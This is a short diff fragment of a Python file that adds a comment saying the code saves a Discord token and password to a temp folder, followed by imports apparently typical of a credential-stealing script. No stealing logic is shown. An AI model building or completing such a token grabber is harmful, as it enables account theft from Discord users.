@@ -1,3 +1,4 @@
+#Saves discord token and password in temp folder
 from base64 import b64decode
 from re import findall
 import threading,os,shutil,sqlite3,json,base64,requests
